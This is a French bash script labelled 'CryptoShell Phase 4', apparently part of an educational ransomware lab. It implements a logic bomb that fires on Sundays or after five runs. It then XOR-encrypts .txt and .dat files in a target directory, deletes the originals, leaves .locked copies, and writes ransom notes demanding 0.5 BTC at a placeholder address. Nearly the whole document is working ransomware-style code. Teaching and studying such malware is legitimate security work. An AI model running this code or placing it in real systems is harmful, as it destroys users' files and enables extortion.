#!/bin/bash
# CryptoShell — Phase 4 : Déclencheur (bombe logique)
# Usage: bash phase4_trigger.sh <répertoire_cible>

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "${SCRIPT_DIR}/../fournis/xor_helper.sh"

TARGET_DIR="${1:-.}"
KEY_FILE=".cryptoshell_key"
COUNTER_FILE=".cs_count"
VICTIM_ID=$(head -c 8 /dev/urandom | xxd -p)

# === 4a) Déclencheur temporel : dimanche uniquement ===
check_trigger_temporal() {
    local day
    day=$(date +%u)
    if [ "$day" -ne 7 ]; then
        echo "[CryptoShell] Condition non remplie (jour=$day, requis=7/dimanche). Sortie."
        exit 0
    fi
    echo "[CryptoShell] Déclencheur temporel activé (dimanche)."
}

# === 4b) Déclencheur par compteur ===
check_trigger_counter() {
    local count=0
    if [ -f "$COUNTER_FILE" ]; then
        count=$(cat "$COUNTER_FILE")
    fi
    count=$((count + 1))
    echo "$count" > "$COUNTER_FILE"

    if [ "$count" -lt 5 ]; then
        echo "[CryptoShell] Exécution $count/5. Pas encore activé."
        exit 0
    fi
    echo "[CryptoShell] Déclencheur compteur activé (exécution $count >= 5)."
    # Supprimer le compteur après activation
    rm -f "$COUNTER_FILE"
}

# Choisir le déclencheur (par défaut: compteur pour les tests)
# Décommenter la ligne souhaitée :
# check_trigger_temporal
check_trigger_counter

# --- Suite identique à Phase 3 ---
KEY=$(generate_key 8)
echo "$KEY" > "$KEY_FILE"

create_ransom_note() {
    local dir="$1"
    cat > "${dir}/RANSOM_NOTE.txt" << EOF
============================================
        CRYPTOSHELL — VOS FICHIERS SONT CHIFFRÉS
============================================
Identifiant victime : ${VICTIM_ID}
Envoyez 0.5 BTC à [ADRESSE FICTIVE — TP ÉDUCATIF]
Contact : cryptoshell@fake-educational.example
[Ceci est un exercice éducatif]
============================================
EOF
}

echo "[CryptoShell] Chiffrement en cours..."

find "$TARGET_DIR" -type f \( -name "*.txt" -o -name "*.dat" \) | while read filepath; do
    case "$filepath" in *.locked) continue ;; esac
    [ "$(basename "$filepath")" = "RANSOM_NOTE.txt" ] && continue

    xor_file "$filepath" "${filepath}.locked" "$KEY"
    rm -f "$filepath"
    echo "  [+] $(basename "$filepath") -> $(basename "$filepath").locked"

    DIR=$(dirname "$filepath")
    if [ ! -f "${DIR}/RANSOM_NOTE.txt" ]; then
        create_ransom_note "$DIR"
    fi
done

echo "[CryptoShell] Chiffrement terminé."
